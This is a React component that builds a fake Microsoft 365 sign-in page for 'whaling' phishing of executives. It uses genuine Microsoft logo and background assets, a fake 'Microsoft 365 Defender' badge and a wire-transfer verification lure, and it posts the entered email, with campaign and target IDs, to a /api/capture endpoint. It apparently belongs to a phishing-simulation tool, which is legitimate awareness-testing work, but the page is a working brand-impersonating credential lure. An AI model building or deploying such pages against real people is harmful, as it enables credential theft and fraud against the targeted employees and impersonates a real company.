'use client';

import React, { useState } from 'react';

export default function WhalingLogin({ campaignId, targetId }: { campaignId: string, targetId: string }) {
  const [email, setEmail] = useState('');

  return (
    <div style={{ fontFamily: '"Segoe UI", "Helvetica Neue", "Lucida Grande", sans-serif', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', backgroundColor: '#f2f2f2' }}>
      
      {/* Background image mockup for M365 */}
      <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: 'url(https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg) center center / cover no-repeat', zIndex: 0 }}></div>

      <div style={{ position: 'relative', zIndex: 1, backgroundColor: '#fff', width: '100%', maxWidth: '440px', padding: '44px', boxSizing: 'border-box', boxShadow: '0 2px 6px rgba(0,0,0,0.2)' }}>
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" style={{ height: '24px', marginBottom: '24px' }} />
        
        <div style={{ marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '10px' }}>
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#D83B01"/>
                <path d="M12 7V13" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                <circle cx="12" cy="16.5" r="1.5" fill="white"/>
             </svg>
             <span style={{ fontSize: '15px', color: '#666', fontWeight: 600 }}>Microsoft 365 Defender</span>
        </div>

        <h1 style={{ fontSize: '24px', fontWeight: 600, color: '#1b1b1b', margin: '0 0 6px' }}>Sign in</h1>
        <p style={{ margin: '0 0 16px', fontSize: '15px', color: '#1b1b1b' }}>
           To review your <strong>Action Required: Wire Transfer Verification</strong> notification, please sign securely.
        </p>

        <form method="POST" action="/api/capture" style={{ display: 'flex', flexDirection: 'column' }}>
          <input type="hidden" name="campaignId" value={campaignId} />
          <input type="hidden" name="targetId" value={targetId} />
          <input type="hidden" name="type" value="WHALING" />

          <input 
            type="email" 
            name="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Executive Email Address"
            required
            style={{
              padding: '6px 0',
              border: 'none',
              borderBottom: '1px solid #666',
              fontSize: '15px',
              marginBottom: '16px',
              outline: 'none',
              color: '#1b1b1b'
            }}
          />
          
          <input 
            type="password" 
            placeholder="Password"
            required
            style={{
              padding: '6px 0',
              border: 'none',
              borderBottom: '1px solid #666',
              fontSize: '15px',
              marginBottom: '32px',
              outline: 'none',
              color: '#1b1b1b'
            }}
          />

          <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '16px' }}>
            <button 
              type="submit"
              style={{
                backgroundColor: '#0067b8',
                color: '#fff',
                border: 'none',
                padding: '4px 32px',
                minHeight: '32px',
                fontSize: '15px',
                cursor: 'pointer',
                transition: '0.2s'
              }}
            >
              Secure Sign In
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
